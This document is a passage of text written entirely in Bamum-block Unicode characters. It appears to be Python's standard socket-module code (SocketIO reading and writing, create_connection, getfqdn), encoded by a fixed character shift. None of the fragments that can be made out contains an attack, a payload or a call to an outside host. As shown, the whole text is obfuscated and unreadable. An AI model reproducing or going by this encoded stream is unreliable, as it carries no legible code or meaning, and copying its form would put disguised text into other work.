ꚭꚫ꛹꛺꛿ꚫ꛴꛹ꚫ꛸꛺ꛯ꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛸꛺ꛯ꛰ꚫꚶꛈꚫꚭꛭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛸꛺ꛯ꛰ꚫꛈꚫ꛸꛺ꛯ꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛽꛰ꛬꛯ꛴꛹꛲ꚫꛈꚫꚭ꛽ꚭꚫ꛴꛹ꚫ꛸꛺ꛯ꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꜂꛽꛴꛿꛴꛹꛲ꚫꛈꚫꚭ꜂ꚭꚫ꛴꛹ꚫ꛸꛺ꛯ꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛿꛴꛸꛰꛺꜀꛿ꛪ꛺ꛮꛮ꜀꛽꛽꛰ꛯꚫꛈꚫꛑꛬ꛷꛾꛰ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛽꛰ꛬꛯ꛴꛹꛿꛺ꚳ꛾꛰꛷꛱ꚷꚫꛭꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛝ꛰ꛬꛯꚫ꜀꛻ꚫ꛿꛺ꚫ꛷꛰꛹ꚳꛭꚴꚫꛭ꜄꛿꛰꛾ꚫ꛴꛹꛿꛺ꚫ꛿꛳꛰ꚫ꜂꛽꛴꛿ꛬꛭ꛷꛰ꚫꛭ꜀꛱꛱꛰꛽ꚫꚵꛭꚵꚫꛬ꛹ꛯꚫ꛽꛰꛿꜀꛽꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛳꛰ꚫ꛹꜀꛸ꛭ꛰꛽ꚫ꛺꛱ꚫꛭ꜄꛿꛰꛾ꚫ꛽꛰ꛬꛯꚹꚫꚫꛔ꛱ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛴꛾ꚫ꛹꛺꛹ꚸꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚫꛬ꛹ꛯꚫ꛹꛺ꚫꛭ꜄꛿꛰꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛬ꛽꛰ꚫꛬ꜁ꛬ꛴꛷ꛬꛭ꛷꛰ꚷꚫꛙ꛺꛹꛰ꚫ꛴꛾ꚫ꛽꛰꛿꜀꛽꛹꛰ꛯꚹꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛔ꛱ꚫꚵꛭꚵꚫ꛴꛾ꚫ꛹꛺꛹ꚸ꛰꛸꛻꛿꜄ꚷꚫꛬꚫꚻꚫ꛽꛰꛿꜀꛽꛹ꚫ꜁ꛬ꛷꜀꛰ꚫ꛴꛹ꛯ꛴ꛮꛬ꛿꛰꛾ꚫ꛿꛳ꛬ꛿ꚫ꛿꛳꛰ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꜂ꛬ꛾ꚫ꛾꛳꜀꛿ꛯ꛺꜂꛹ꚫꛬ꛿ꚫ꛿꛳꛰ꚫ꛺꛿꛳꛰꛽ꚫ꛰꛹ꛯꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛝ꛰ꛬꛯꛬꛭ꛷꛰ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛿꛴꛸꛰꛺꜀꛿ꛪ꛺ꛮꛮ꜀꛽꛽꛰ꛯꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛚꛞꛐ꛽꛽꛺꛽ꚳꚭꛮꛬ꛹꛹꛺꛿ꚫ꛽꛰ꛬꛯꚫ꛱꛽꛺꛸ꚫ꛿꛴꛸꛰ꛯꚫ꛺꜀꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꜂꛳꛴꛷꛰ꚫꛟ꛽꜀꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛺ꛮ꛶ꚹ꛽꛰ꛮ꜁ꛪ꛴꛹꛿꛺ꚳꛭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫ꛿꛴꛸꛰꛺꜀꛿ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛿꛴꛸꛰꛺꜀꛿ꛪ꛺ꛮꛮ꜀꛽꛽꛰ꛯꚫꛈꚫꛟ꛽꜀꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫ꛰꛽꛽꛺꛽ꚫꛬ꛾ꚫ꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛰ꚹ꛰꛽꛽꛹꛺ꚫ꛴꛹ꚫꛪꛭ꛷꛺ꛮ꛶꛴꛹꛲ꛪ꛰꛽꛽꛹꛺꛾ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꜂꛽꛴꛿꛰ꚳ꛾꛰꛷꛱ꚷꚫꛭꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛢ꛽꛴꛿꛰ꚫ꛿꛳꛰ꚫ꛲꛴꜁꛰꛹ꚫꛭ꜄꛿꛰꛾ꚫ꛺꛽ꚫꛭ꜄꛿꛰ꛬ꛽꛽ꛬ꜄ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫꚵꛭꚵꚫ꛿꛺ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛬ꛹ꛯꚫ꛽꛰꛿꜀꛽꛹ꚫ꛿꛳꛰ꚫ꛹꜀꛸ꛭ꛰꛽ꚫ꛺꛱ꚫꛭ꜄꛿꛰꛾ꚫ꜂꛽꛴꛿꛿꛰꛹ꚹꚫꚫꛟ꛳꛴꛾ꚫꛮꛬ꛹ꚫꛭ꛰ꚫ꛷꛰꛾꛾ꚫ꛿꛳ꛬ꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛷꛰꛹ꚳꛭꚴꚫ꛴꛱ꚫ꛹꛺꛿ꚫꛬ꛷꛷ꚫꛯꛬ꛿ꛬꚫꛮ꛺꜀꛷ꛯꚫꛭ꛰ꚫ꜂꛽꛴꛿꛿꛰꛹ꚹꚫꚫꛔ꛱ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛴꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛹꛺꛹ꚸꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚫꛬ꛹ꛯꚫ꛹꛺ꚫꛭ꜄꛿꛰꛾ꚫꛮ꛺꜀꛷ꛯꚫꛭ꛰ꚫ꜂꛽꛴꛿꛿꛰꛹ꚫꛙ꛺꛹꛰ꚫ꛴꛾ꚫ꛽꛰꛿꜀꛽꛹꛰ꛯꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛢ꛽꛴꛿ꛬꛭ꛷꛰ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛺ꛮ꛶ꚹ꛾꛰꛹ꛯꚳꛭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫ꛰꛽꛽꛺꛽ꚫꛬ꛾ꚫ꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛣꛣꛣꚫ꜂꛳ꛬ꛿ꚫꛬꛭ꛺꜀꛿ꚫꛐꛔꛙꛟꛝꛊꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛰ꚹ꛰꛽꛽꛹꛺ꚫ꛴꛹ꚫꛪꛭ꛷꛺ꛮ꛶꛴꛹꛲ꛪ꛰꛽꛽꛹꛺꛾ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛽꛰ꛬꛯꛬꛭ꛷꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛟ꛽꜀꛰ꚫ꛴꛱ꚫ꛿꛳꛰ꚫꛞ꛺ꛮ꛶꛰꛿ꛔꛚꚫ꛴꛾ꚫ꛺꛻꛰꛹ꚫ꛱꛺꛽ꚫ꛽꛰ꛬꛯ꛴꛹꛲ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛮ꛷꛺꛾꛰ꛯꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛔꚺꛚꚫ꛺꛻꛰꛽ꛬ꛿꛴꛺꛹ꚫ꛺꛹ꚫꛮ꛷꛺꛾꛰ꛯꚫ꛾꛺ꛮ꛶꛰꛿ꚹꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛽꛰ꛬꛯ꛴꛹꛲ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꜂꛽꛴꛿ꛬꛭ꛷꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛟ꛽꜀꛰ꚫ꛴꛱ꚫ꛿꛳꛰ꚫꛞ꛺ꛮ꛶꛰꛿ꛔꛚꚫ꛴꛾ꚫ꛺꛻꛰꛹ꚫ꛱꛺꛽ꚫ꜂꛽꛴꛿꛴꛹꛲ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛮ꛷꛺꛾꛰ꛯꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛔꚺꛚꚫ꛺꛻꛰꛽ꛬ꛿꛴꛺꛹ꚫ꛺꛹ꚫꛮ꛷꛺꛾꛰ꛯꚫ꛾꛺ꛮ꛶꛰꛿ꚹꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꜂꛽꛴꛿꛴꛹꛲ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛰꛶ꛬꛭ꛷꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛟ꛽꜀꛰ꚫ꛴꛱ꚫ꛿꛳꛰ꚫꛞ꛺ꛮ꛶꛰꛿ꛔꛚꚫ꛴꛾ꚫ꛺꛻꛰꛹ꚫ꛱꛺꛽ꚫ꛾꛰꛰꛶꛴꛹꛲ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛮ꛷꛺꛾꛰ꛯꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛔꚺꛚꚫ꛺꛻꛰꛽ꛬ꛿꛴꛺꛹ꚫ꛺꛹ꚫꛮ꛷꛺꛾꛰ꛯꚫ꛾꛺ꛮ꛶꛰꛿ꚹꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꜀꛻꛰꛽ꚳꚴꚹ꛾꛰꛰꛶ꛬꛭ꛷꛰ꚳꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛱꛴꛷꛰꛹꛺ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛝ꛰꛿꜀꛽꛹ꚫ꛿꛳꛰ꚫ꛱꛴꛷꛰ꚫꛯ꛰꛾ꛮ꛽꛴꛻꛿꛺꛽ꚫ꛺꛱ꚫ꛿꛳꛰ꚫ꜀꛹ꛯ꛰꛽꛷꜄꛴꛹꛲ꚫ꛾꛺ꛮ꛶꛰꛿ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛺ꛮ꛶ꚹ꛱꛴꛷꛰꛹꛺ꚳꚴꚕꚕꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛹ꛬ꛸꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛾꛰꛷꛱ꚹꛮ꛷꛺꛾꛰ꛯꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹ꛱꛴꛷꛰꛹꛺ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꚸꚼꚕꚕꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛸꛺ꛯ꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛸꛺ꛯ꛰ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛮ꛷꛺꛾꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛎ꛷꛺꛾꛰ꚫ꛿꛳꛰ꚫꛞ꛺ꛮ꛶꛰꛿ꛔꛚꚫ꛺ꛭ꛵꛰ꛮ꛿ꚹꚫꚫꛟ꛳꛴꛾ꚫꛯ꛺꛰꛾꛹ꚲ꛿ꚫꛮ꛷꛺꛾꛰ꚫ꛿꛳꛰ꚫ꜀꛹ꛯ꛰꛽꛷꜄꛴꛹꛲ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶꛰꛿ꚷꚫ꛰꜃ꛮ꛰꛻꛿ꚫ꛴꛱ꚫꛬ꛷꛷ꚫ꛽꛰꛱꛰꛽꛰꛹ꛮ꛰꛾ꚫ꛿꛺ꚫ꛴꛿ꚫ꛳ꛬ꜁꛰ꚫꛯ꛴꛾ꛬ꛻꛻꛰ꛬ꛽꛰ꛯꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛮ꛷꛺꛾꛰ꛯꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛺ꚹꛝꛬ꜂ꛔꛚꛍꛬ꛾꛰ꚹꛮ꛷꛺꛾꛰ꚳ꛾꛰꛷꛱ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛺ꛮ꛶ꚹꛪꛯ꛰ꛮ꛽꛰꛱ꛪ꛾꛺ꛮ꛶꛰꛿꛴꛺꛾ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛺ꛮ꛶ꚫꛈꚫꛙ꛺꛹꛰ꚕꚕꚕꛯ꛰꛱ꚫ꛲꛰꛿꛱꛼ꛯ꛹ꚳ꛹ꛬ꛸꛰ꛈꚲꚲꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛒ꛰꛿ꚫ꛱꜀꛷꛷꜄ꚫ꛼꜀ꛬ꛷꛴꛱꛴꛰ꛯꚫꛯ꛺꛸ꛬ꛴꛹ꚫ꛹ꛬ꛸꛰ꚫ꛱꛽꛺꛸ꚫ꛹ꛬ꛸꛰ꚹꚕꚕꚫꚫꚫꚫꛌ꛹ꚫ꛰꛸꛻꛿꜄ꚫꛬ꛽꛲꜀꛸꛰꛹꛿ꚫ꛴꛾ꚫ꛴꛹꛿꛰꛽꛻꛽꛰꛿꛰ꛯꚫꛬ꛾ꚫ꛸꛰ꛬ꛹꛴꛹꛲ꚫ꛿꛳꛰ꚫ꛷꛺ꛮꛬ꛷ꚫ꛳꛺꛾꛿ꚹꚕꚕꚫꚫꚫꚫꛑ꛴꛽꛾꛿ꚫ꛿꛳꛰ꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫ꛽꛰꛿꜀꛽꛹꛰ꛯꚫꛭ꜄ꚫ꛲꛰꛿꛳꛺꛾꛿ꛭ꜄ꛬꛯꛯ꛽ꚳꚴꚫ꛴꛾ꚫꛮ꛳꛰ꛮ꛶꛰ꛯꚷꚫ꛿꛳꛰꛹ꚕꚫꚫꚫꚫ꛻꛺꛾꛾꛴ꛭ꛷꜄ꚫ꛰꜃꛴꛾꛿꛴꛹꛲ꚫꛬ꛷꛴ꛬ꛾꛰꛾ꚹꚫꛔ꛹ꚫꛮꛬ꛾꛰ꚫ꛹꛺ꚫꛑꛜꛏꛙꚫ꛴꛾ꚫꛬ꜁ꛬ꛴꛷ꛬꛭ꛷꛰ꚫꛬ꛹ꛯꚫꛫ꛹ꛬ꛸꛰ꛫꚕꚫꚫꚫꚫ꜂ꛬ꛾ꚫ꛲꛴꜁꛰꛹ꚷꚫ꛴꛿ꚫ꛴꛾ꚫ꛽꛰꛿꜀꛽꛹꛰ꛯꚫ꜀꛹ꛮ꛳ꛬ꛹꛲꛰ꛯꚹꚫꛔ꛱ꚫꛫ꛹ꛬ꛸꛰ꛫꚫ꜂ꛬ꛾ꚫ꛰꛸꛻꛿꜄ꚷꚫꚲꚻꚹꚻꚹꚻꚹꚻꚲꚫ꛺꛽ꚫꚲꛅꛅꚲꚷꚕꚫꚫꚫꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫ꛱꛽꛺꛸ꚫ꛲꛰꛿꛳꛺꛾꛿꛹ꛬ꛸꛰ꚳꚴꚫ꛴꛾ꚫ꛽꛰꛿꜀꛽꛹꛰ꛯꚹꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫ꛹ꛬ꛸꛰ꚫꛈꚫ꛹ꛬ꛸꛰ꚹ꛾꛿꛽꛴꛻ꚳꚴꚕꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛹ꛬ꛸꛰ꚫ꛺꛽ꚫ꛹ꛬ꛸꛰ꚫ꛴꛹ꚫꚳꚲꚻꚹꚻꚹꚻꚹꚻꚲꚷꚫꚲꛅꛅꚲꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛹ꛬ꛸꛰ꚫꛈꚫ꛲꛰꛿꛳꛺꛾꛿꛹ꛬ꛸꛰ꚳꚴꚕꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚷꚫꛬ꛷꛴ꛬ꛾꛰꛾ꚷꚫ꛴꛻ꛬꛯꛯ꛽꛾ꚫꛈꚫ꛲꛰꛿꛳꛺꛾꛿ꛭ꜄ꛬꛯꛯ꛽ꚳ꛹ꛬ꛸꛰ꚴꚕꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫ꛰꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛻ꛬ꛾꛾ꚕꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛬ꛷꛴ꛬ꛾꛰꛾ꚹ꛴꛹꛾꛰꛽꛿ꚳꚻꚷꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛺꛽ꚫ꛹ꛬ꛸꛰ꚫ꛴꛹ꚫꛬ꛷꛴ꛬ꛾꛰꛾ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꚲꚹꚲꚫ꛴꛹ꚫ꛹ꛬ꛸꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛭ꛽꛰ꛬ꛶ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛹ꛬ꛸꛰ꚫꛈꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚕꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛹ꛬ꛸꛰ꚕꚕꚕꛪꛒꛗꛚꛍꛌꛗꛪꛏꛐꛑꛌꛠꛗꛟꛪꛟꛔꛘꛐꛚꛠꛟꚫꛈꚫ꛺ꛭ꛵꛰ꛮ꛿ꚳꚴꚕꚕꛯ꛰꛱ꚫꛮ꛽꛰ꛬ꛿꛰ꛪꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚳꛬꛯꛯ꛽꛰꛾꛾ꚷꚫ꛿꛴꛸꛰꛺꜀꛿ꛈꛪꛒꛗꛚꛍꛌꛗꛪꛏꛐꛑꛌꛠꛗꛟꛪꛟꛔꛘꛐꛚꛠꛟꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺꜀꛽ꛮ꛰ꛪꛬꛯꛯ꛽꛰꛾꛾ꛈꛙ꛺꛹꛰ꚷꚫꚵꚷꚫꛬ꛷꛷ꛪ꛰꛽꛽꛺꛽꛾ꛈꛑꛬ꛷꛾꛰ꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛎ꛺꛹꛹꛰ꛮ꛿ꚫ꛿꛺ꚫꚵꛬꛯꛯ꛽꛰꛾꛾ꚵꚫꛬ꛹ꛯꚫ꛽꛰꛿꜀꛽꛹ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚹꚕꚕꚫꚫꚫꚫꛎ꛺꛹꜁꛰꛹꛴꛰꛹ꛮ꛰ꚫ꛱꜀꛹ꛮ꛿꛴꛺꛹ꚹꚫꚫꛎ꛺꛹꛹꛰ꛮ꛿ꚫ꛿꛺ꚫꚵꛬꛯꛯ꛽꛰꛾꛾ꚵꚫꚳꛬꚫꚽꚸ꛿꜀꛻꛷꛰ꚫꛫꛫꚳ꛳꛺꛾꛿ꚷꚕꚫꚫꚫꚫ꛻꛺꛽꛿ꚴꛫꛫꚴꚫꛬ꛹ꛯꚫ꛽꛰꛿꜀꛽꛹ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚹꚫꚫꛛꛬ꛾꛾꛴꛹꛲ꚫ꛿꛳꛰ꚫ꛺꛻꛿꛴꛺꛹ꛬ꛷ꚕꚫꚫꚫꚫꚵ꛿꛴꛸꛰꛺꜀꛿ꚵꚫ꛻ꛬ꛽ꛬ꛸꛰꛿꛰꛽ꚫ꜂꛴꛷꛷ꚫ꛾꛰꛿ꚫ꛿꛳꛰ꚫ꛿꛴꛸꛰꛺꜀꛿ꚫ꛺꛹ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛴꛹꛾꛿ꛬ꛹ꛮ꛰ꚕꚫꚫꚫꚫꛭ꛰꛱꛺꛽꛰ꚫꛬ꛿꛿꛰꛸꛻꛿꛴꛹꛲ꚫ꛿꛺ꚫꛮ꛺꛹꛹꛰ꛮ꛿ꚹꚫꚫꛔ꛱ꚫ꛹꛺ꚫꚵ꛿꛴꛸꛰꛺꜀꛿ꚵꚫ꛴꛾ꚫ꛾꜀꛻꛻꛷꛴꛰ꛯꚷꚫ꛿꛳꛰ꚕꚫꚫꚫꚫ꛲꛷꛺ꛭꛬ꛷ꚫꛯ꛰꛱ꛬ꜀꛷꛿ꚫ꛿꛴꛸꛰꛺꜀꛿ꚫ꛾꛰꛿꛿꛴꛹꛲ꚫ꛽꛰꛿꜀꛽꛹꛰ꛯꚫꛭ꜄ꚫꛅ꛱꜀꛹ꛮꛅꛫ꛲꛰꛿ꛯ꛰꛱ꛬ꜀꛷꛿꛿꛴꛸꛰꛺꜀꛿ꛫꚕꚫꚫꚫꚫ꛴꛾ꚫ꜀꛾꛰ꛯꚹꚫꚫꛔ꛱ꚫꚵ꛾꛺꜀꛽ꛮ꛰ꛪꛬꛯꛯ꛽꛰꛾꛾ꚵꚫ꛴꛾ꚫ꛾꛰꛿ꚫ꛴꛿ꚫ꛸꜀꛾꛿ꚫꛭ꛰ꚫꛬꚫ꛿꜀꛻꛷꛰ꚫ꛺꛱ꚫꚳ꛳꛺꛾꛿ꚷꚫ꛻꛺꛽꛿ꚴꚕꚫꚫꚫꚫ꛱꛺꛽ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛿꛺ꚫꛭ꛴꛹ꛯꚫꛬ꛾ꚫꛬꚫ꛾꛺꜀꛽ꛮ꛰ꚫꛬꛯꛯ꛽꛰꛾꛾ꚫꛭ꛰꛱꛺꛽꛰ꚫ꛸ꛬ꛶꛴꛹꛲ꚫ꛿꛳꛰ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚹꚕꚫꚫꚫꚫꛌꚫ꛳꛺꛾꛿ꚫ꛺꛱ꚫꚲꚲꚫ꛺꛽ꚫ꛻꛺꛽꛿ꚫꚻꚫ꛿꛰꛷꛷꛾ꚫ꛿꛳꛰ꚫꛚꛞꚫ꛿꛺ꚫ꜀꛾꛰ꚫ꛿꛳꛰ꚫꛯ꛰꛱ꛬ꜀꛷꛿ꚹꚫꛢ꛳꛰꛹ꚫꛬꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚕꚫꚫꚫꚫꛮꛬ꛹꛹꛺꛿ꚫꛭ꛰ꚫꛮ꛽꛰ꛬ꛿꛰ꛯꚷꚫ꛽ꛬ꛴꛾꛰꛾ꚫ꛿꛳꛰ꚫ꛷ꛬ꛾꛿ꚫ꛰꛽꛽꛺꛽ꚫ꛴꛱ꚫꚵꛬ꛷꛷ꛪ꛰꛽꛽꛺꛽꛾ꚵꚫ꛴꛾